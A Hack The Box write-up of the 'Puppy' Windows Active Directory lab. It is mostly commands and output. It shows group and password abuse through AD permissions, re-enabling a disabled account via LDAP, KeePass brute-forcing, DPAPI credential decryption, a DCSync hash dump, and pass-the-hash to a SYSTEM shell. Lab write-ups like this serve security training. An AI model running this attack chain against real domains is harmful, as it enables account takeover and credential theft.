---
title: Puppy HTB Writeup
date: 2025-05-22
description: This is my writeup of Puppy Windows Box From Hack The Box (Medium)
image: Puppy.png
tags:
    - markdown
    - css
    - html
    - themes
categories:
    - themes
    - syntax
---

Nmap scan.

```zsh
Nmap scan report for 10.10.11.70 (10.10.11.70)
Host is up, received user-set (0.14s latency).
Scanned at 2025-05-19 13:04:52 +01 for 191s
Not shown: 985 filtered tcp ports (no-response)
Bug in iscsi-info: no string output.
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-05-20 01:04:53Z)
111/tcp  open  rpcbind       syn-ack ttl 127 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
2049/tcp open  nlockmgr      syn-ack ttl 127 1-4 (RPC #100021)
3260/tcp open  iscsi?        syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=5/19%OT=53%CT=%CU=%PV=Y%G=N%TM=682B1F23%P=x86_64-pc-linux-gnu)
SEQ(SP=104%GCD=1%ISR=10C%TI=I%II=I%SS=S%TS=A)
SEQ(SP=106%GCD=1%ISR=10D%TI=I%II=I%SS=S%TS=A)
OPS(O1=M552NW8ST11%O2=M552NW8ST11%O3=M552NW8NNT11%O4=M552NW8ST11%O5=M552NW8ST11%O6=M552ST11)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M552NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Uptime guess: 0.024 days (since Mon May 19 12:33:49 2025)
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 62785/tcp): CLEAN (Timeout)
|   Check 2 (port 47994/tcp): CLEAN (Timeout)
|   Check 3 (port 26380/udp): CLEAN (Timeout)
|   Check 4 (port 46192/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 12h59m43s
| smb2-time: 
|   date: 2025-05-20T01:07:03
|_  start_date: N/A
```


## Foothold :

I enumerated shares using `NetExec` but nothing interesting is showed up.

```zsh
nxc smb puppy.htb -u 'levi.james' -p 'KingofAkron2025!' --shares                                            ✔  14:18:53  
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025! 
SMB         10.10.11.70     445    DC               [*] Enumerated shares
SMB         10.10.11.70     445    DC               Share           Permissions     Remark
SMB         10.10.11.70     445    DC               -----           -----------     ------
SMB         10.10.11.70     445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.70     445    DC               C$                              Default share
SMB         10.10.11.70     445    DC               DEV                             DEV-SHARE for PUPPY-DEVS
SMB         10.10.11.70     445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.70     445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.11.70     445    DC               SYSVOL          READ            Logon server share 
```

Since this is credentialed, i used them to gather Bloodhound digest to get a better view of the whole environement.

```zsh
 bloodhound-python -u levi.james -p 'KingofAkron2025!' -d puppy.htb -ns 10.10.11.70 -c All  
```

As we can see our user `levi.james` is part of the `HR` group, who's members have `GenericWrite` over the `DEVELOPERS` Group. 

![[Puppy2.png]]

We can leverage that by adding this user the  `DEVELOPERS` Group.

```zsh
net rpc group addmem "DEVELOPERS" "levi.james" -U "PUPPY.HTB"/"levi.james"%"KingofAkron2025\!" -S "DC.PUPPY.HTB"
Can't load /etc/samba/smb.conf - run testparm to debug it
```

By enumerating shares once again, we can see that we have READ access to the `DEV` share.

```zsh
nxc smb puppy.htb -u 'levi.james' -p 'KingofAkron2025!' --shares         

SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025! 
SMB         10.10.11.70     445    DC               [*] Enumerated shares
SMB         10.10.11.70     445    DC               Share           Permissions     Remark
SMB         10.10.11.70     445    DC               -----           -----------     ------
SMB         10.10.11.70     445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.70     445    DC               C$                              Default share
SMB         10.10.11.70     445    DC               DEV             READ            DEV-SHARE for PUPPY-DEVS
SMB         10.10.11.70     445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.70     445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.11.70     445    DC               SYSVOL          READ            Logon server share 
```

After accessing the share i can see a `.kdbx` database extension file.
 
```zsh
smbclient //dc.puppy.htb/DEV -U 'PUPPY.HTB\levi.james'                 

Can't load /etc/samba/smb.conf - run testparm to debug it
Password for [PUPPY.HTB\levi.james]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sun Mar 23 07:07:57 2025
  ..                                  D        0  Sat Mar  8 16:52:57 2025
  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 07:09:12 2025
  Projects                            D        0  Sat Mar  8 16:53:36 2025
  recovery.kdbx                       A     2677  Wed Mar 12 02:25:46 2025
```

While trying to access it, it looks like it require a password.

![[Puppy3.png]]

I cracked the `.kdbx` file using the [keepass4brute](https://github.com/r3nt0n/keepass4brute), and the password is `liverpool`

```zsh
 ./keepass4brute.sh ../recovery.kdbx rockyou.txt 
  
keepass4brute 1.3 by r3nt0n
https://github.com/r3nt0n/keepass4brute

[+] Words tested: 36/14344391 - Attempts per minute: 86 - Estimated time remaining: 16 weeks, 3 days
[+] Current attempt: liverpool

[*] Password found: liverpool
```

As we see i got access to these users passwords.

![[Puppy4.png]]

The `adam.silver` password is not working  as `nxc` show below.

```zsh
 nxc smb puppy.htb -u 'adam.silver' -p 'HJKL2025!'
                     
 SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\adam.silver:HJKL2025! STATUS_LOGON_FAILURE 
```

As oppose the `Antony C. Edwards` one is working, but with with the SamAccountName `ant.edwards`

```zsh
nxc smb puppy.htb -u 'ant.edwards' -p 'Antman2025!'

SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\ant.edwards:Antman2025! 
```

After a quick search on this user, i found that we have `GenericAll` over the `adam.silver` user, who is part of the `Remote Management` Group.

![[Puppy5.png]]

We can now change this user's password.

```zsh
 net rpc password "adam.silver" "P@ssword2025" -U "PUPPY.HTB"/"ant.edwards"%"Antman2025\!" -S "dc.puppy.htb"
Can't load /etc/samba/smb.conf - run testparm to debug it
```

Even though it still no working, because the account is disabled.
This how to disable the user's account.

```zsh
ldapmodify -x -H ldap://10.10.11.70 \                               
-D 'ant.edwards@puppy.htb' -w 'Antman2025!' <<EOF
dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
changetype: modify
replace: userAccountControl
userAccountControl: 512
EOF
modifying entry "CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB"
```

And just like that we got the user flag!!

![[Puppy6.png]]

## Root :

Navigating through the File system as `adam.silver` i found this `C:\Backups` file which unusual, where i found this `site-backup-2024-12-30.zip` file.

```zsh
*Evil-WinRM* PS C:\Backups> ls

    Directory: C:\Backups

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/8/2025   8:22 AM        4639546 site-backup-2024-12-30.zip
```

After getting the zip file locally and looking through it i found this config file, that expose the `steph.cooper` credentials.

![[Puppy7.png]]

These are valid as `nxc` says.

```zsh
nxc smb puppy.htb -u 'steph.cooper' -p 'ChefSteph2025!'

SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\steph.cooper:ChefSteph2025! 
```
``
This user is part of the `Remote Management` group as well. So i used `evil-winrm` to enumerate further.

This time i used `winPEASx64.exe`. As it shows below it reveals some DPAPI Master keys and Credential file under the `steph.cooper` user.

```PowerShell
*Evil-WinRM* PS C:\Users\steph.cooper\Documents> .\winPEASx64.exe

.
.
.
<SNIP>
.
.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Master Keys
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dpapi
    MasterKey: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407
    Accessed: 3/8/2025 7:40:36 AM
    Modified: 3/8/2025 7:40:36 AM
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Credential Files
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dpapi
    CredFile: C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
    Description: Local Credential Data

    MasterKey: 556a2412-1275-4ccf-b721-e6a0b4f90407
    Accessed: 3/8/2025 8:14:09 AM
    Modified: 3/8/2025 8:14:09 AM
    Size: 11068
   =================================================================================================

    CredFile: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9
    Description: Enterprise Credential Data

    MasterKey: 556a2412-1275-4ccf-b721-e6a0b4f90407
    Accessed: 3/8/2025 7:54:29 AM
    Modified: 3/8/2025 7:54:29 AM
    Size: 414
   =================================================================================================

È Follow the provided link for further instructions in how to decrypt the creds file

.
.
.
<SNIP>
.
.

```

Master key :

```zsh
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107> copy 556a2412-1275-4ccf-b721-e6a0b4f90407 C:\Users\steph.cooper\Desktop

*Evil-WinRM* PS C:\USers\steph.cooper\Desktop> attrib -h -s 556a2412-1275-4ccf-b721-e6a0b4f90407
*Evil-WinRM* PS C:\USers\steph.cooper\Desktop> download 556a2412-1275-4ccf-b721-e6a0b4f90407
                                        
Info: Downloading C:\USers\steph.cooper\Desktop\556a2412-1275-4ccf-b721-e6a0b4f90407 to 556a2412-1275-4ccf-b721-e6a0b4f90407
                                        
Info: Download successful!
```

Credential File :

```zsh
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials> attrib -h -s C8D69EBE9A43E9DEBF6B5FBD48B521B9

*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials> cp C8D69EBE9A43E9DEBF6B5FBD48B521B9 C:\Users\steph.cooper\Desktop

*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials> cd C:\Users\steph.cooper\Desktop
*Evil-WinRM* PS C:\Users\steph.cooper\Desktop> download C8D69EBE9A43E9DEBF6B5FBD48B521B9
                                        
Info: Downloading C:\Users\steph.cooper\Desktop\C8D69EBE9A43E9DEBF6B5FBD48B521B9 to C8D69EBE9A43E9DEBF6B5FBD48B521B9
                                        
Info: Download successful!
```


The first step involves decrypting the **Master Key** using the `dpapi.py` tool. The Master Key is encrypted and tied to the user's `SID` and password.

```zsh
dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!' 
Impacket v0.11.0 - Copyright 2023 Fortra

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407
Flags       :        0 (0)
Policy      : 4ccf1275 (1288639093)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

Once the Master Key is decrypted, it can be used to decrypt stored credentials. This command decrypts the credential file using the extracted Master Key. 

```zsh
 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84 
Impacket v0.11.0 - Copyright 2023 Fortra

[CREDENTIAL]
LastWritten : 2025-03-08 15:54:29
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=PUPPY.HTB
Description : 
Unknown     : 
Username    : steph.cooper_adm
Unknown     : FivethChipOnItsWay2025!
```

`Bloodhound` shows that this user have DCSync Right over the whole domain.

![[Puppy1.png]]

Now let's DCsync using `secretsdump.py` :

```zsh
sudo secretsdump.py "puppy.htb/steph.cooper_adm:FivethChipOnItsWay2025\!"@"dc.puppy.htb"
[sudo] password for razio: 
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0xa943f13896e3e21f6c4100c7da9895a6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9c541c389e2904b9b112f599fd6b333d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
PUPPY\DC$:aes256-cts-hmac-sha1-96:f4f395e28f0933cac28e02947bc68ee11b744ee32b6452dbf795d9ec85ebda45
PUPPY\DC$:aes128-cts-hmac-sha1-96:4d596c7c83be8cd71563307e496d8c30
PUPPY\DC$:des-cbc-md5:54e9a11619f8b9b5
PUPPY\DC$:plain_password_hex:84880c04e892448b6419dda6b840df09465ffda259692f44c2b3598d8f6b9bc1b0bc37b17528d18a1e10704932997674cbe6b89fd8256d5dfeaa306dc59f15c1834c9ddd333af63b249952730bf256c3afb34a9cc54320960e7b3783746ffa1a1528c77faa352a82c13d7c762c34c6f95b4bbe04f9db6164929f9df32b953f0b419fbec89e2ecb268ddcccb4324a969a1997ae3c375cc865772baa8c249589e1757c7c36a47775d2fc39e566483d0fcd48e29e6a384dc668228186a2196e48c7d1a8dbe6b52fc2e1392eb92d100c46277e1b2f43d5f2b188728a3e6e5f03582a9632da8acfc4d992899f3b64fe120e13
PUPPY\DC$:aad3b435b51404eeaad3b435b51404ee:d5047916131e6ba897f975fc5f19c8df:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xc21ea457ed3d6fd425344b3a5ca40769f14296a3
dpapi_userkey:0xcb6a80b44ae9bdd7f368fb674498d265d50e29bf
[*] NL$KM 
 0000   DD 1B A5 A0 33 E7 A0 56  1C 3F C3 F5 86 31 BA 09   ....3..V.?...1..
 0010   1A C4 D4 6A 3C 2A FA 15  26 06 3B 93 E0 66 0F 7A   ...j<*..&.;..f.z
 0020   02 9A C7 2E 52 79 C1 57  D9 0C D3 F6 17 79 EF 3F   ....Ry.W.....y.?
 0030   75 88 A3 99 C7 E0 2B 27  56 95 5C 6B 85 81 D0 ED   u.....+'V.\k....
NL$KM:dd1ba5a033e7a0561c3fc3f58631ba091ac4d46a3c2afa1526063b93e0660f7a029ac72e5279c157d90cd3f61779ef3f7588a399c7e02b2756955c6b8581d0ed
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb0edc15e49ceb4120c7bd7e6e65d75b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a4f2989236a639ef3f766e5fe1aad94a:::
PUPPY.HTB\levi.james:1103:aad3b435b51404eeaad3b435b51404ee:ff4269fdf7e4a3093995466570f435b8:::
PUPPY.HTB\ant.edwards:1104:aad3b435b51404eeaad3b435b51404ee:afac881b79a524c8e99d2b34f438058b:::
PUPPY.HTB\adam.silver:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:::
PUPPY.HTB\jamie.williams:1106:aad3b435b51404eeaad3b435b51404ee:bd0b8a08abd5a98a213fc8e3c7fca780:::
PUPPY.HTB\steph.cooper:1107:aad3b435b51404eeaad3b435b51404ee:b261b5f931285ce8ea01a8613f09200b:::
PUPPY.HTB\steph.cooper_adm:1111:aad3b435b51404eeaad3b435b51404ee:ccb206409049bc53502039b80f3f1173:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5047916131e6ba897f975fc5f19c8df:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:c0b23d37b5ad3de31aed317bf6c6fd1f338d9479def408543b85bac046c596c0
Administrator:aes128-cts-hmac-sha1-96:2c74b6df3ba6e461c9d24b5f41f56daf

.
.
.
<SNIP>
.
.
.


[*] Cleaning up... 
```

And finally, we got a shell as the administrator using the Administrator's hash for the above dump:

```zsh
psexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:bb0edc15e49ceb4120c7bd7e6e65d75b' 'Administrator@dc.puppy.htb'
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on dc.puppy.htb.....
[*] Found writable share ADMIN$
[*] Uploading file PEFrQaPk.exe
[*] Opening SVCManager on dc.puppy.htb.....
[*] Creating service sMPL on dc.puppy.htb.....
[*] Starting service sMPL.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.3453]
(c) Microsoft Corporation. All rights reserved.


C:\Windows\system32> whoami
nt authority\system
``` 
